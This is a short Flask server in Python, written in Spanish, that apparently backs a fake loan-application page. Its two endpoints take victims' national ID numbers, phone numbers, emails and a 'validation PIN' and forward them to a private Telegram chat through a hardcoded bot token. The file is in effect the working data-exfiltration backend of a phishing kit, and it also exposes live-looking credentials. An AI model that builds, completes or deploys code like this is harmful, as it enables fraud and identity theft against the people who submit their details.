from flask import Flask, send_file, request, jsonify
import requests

app = Flask(__name__, static_folder='.', static_url_path='')

TELEGRAM_TOKEN = '8617327971:AAELw3bgOtZCz73SsoHFsx_8fIBSPbeFwkI'
TELEGRAM_CHAT_ID = '7813367667'

@app.route('/')
def index():
    return send_file('index.html')

@app.route('/index2.html')
def index2():
    return send_file('index2.html')

@app.route('/api/send-telegram', methods=['POST'])
def send_telegram():
    data = request.json

    message = f"""
📋 *Nueva Solicitud de Préstamo*

💰 Monto: {data.get('amount', 'N/A')}
🆔 DNI: {data.get('dni', 'N/A')}
📱 Celular: {data.get('phone', 'N/A')}
📧 Correo: {data.get('email', 'N/A')}
"""

    try:
        url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
        print(f"Enviando a Telegram: {url}")
        print(f"Chat ID: {TELEGRAM_CHAT_ID}")
        print(f"Mensaje: {message}")

        response = requests.post(url, json={
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }, timeout=10)

        print(f"Respuesta: {response.status_code} - {response.text}")

        if response.status_code == 200:
            return jsonify({'success': True, 'message': 'Mensaje enviado'})
        else:
            return jsonify({'success': False, 'error': response.text}), 400
    except Exception as e:
        print(f"Error: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/send-pin', methods=['POST'])
def send_pin():
    data = request.json
    pin = data.get('pin', 'N/A')

    message = f"""
🔐 *PIN de Validación*

🔑 Clave: {pin}
"""

    try:
        url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
        print(f"Enviando PIN a Telegram: {url}")
        print(f"Chat ID: {TELEGRAM_CHAT_ID}")
        print(f"Mensaje: {message}")

        response = requests.post(url, json={
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }, timeout=10)

        print(f"Respuesta: {response.status_code} - {response.text}")

        if response.status_code == 200:
            return jsonify({'success': True, 'message': 'PIN enviado'})
        else:
            return jsonify({'success': False, 'error': response.text}), 400
    except Exception as e:
        print(f"Error: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, host='localhost', port=5000)
